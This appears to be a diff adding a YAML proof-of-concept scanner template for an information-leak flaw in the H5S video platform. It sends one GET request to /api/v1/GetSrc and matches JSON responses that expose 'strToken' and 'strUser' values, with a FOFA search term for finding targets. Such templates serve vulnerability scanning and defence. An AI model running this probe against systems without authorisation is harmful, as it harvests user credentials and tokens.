@@ -1,0 +1,15 @@
+id: poc-yaml-h5s-video-platform-information-leak
+info:
+  name: H5S视频平台 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: H5S视频平台
+  fofa: H5S视频平台
+requests:
+- method: GET
+  path: /api/v1/GetSrc
+  expression: status_code == 200 && contains(body,"\"strToken\"") && contains(body,"\"strUser\"")
+    && content_type == "application/json"
+variables: {}
+transport: http
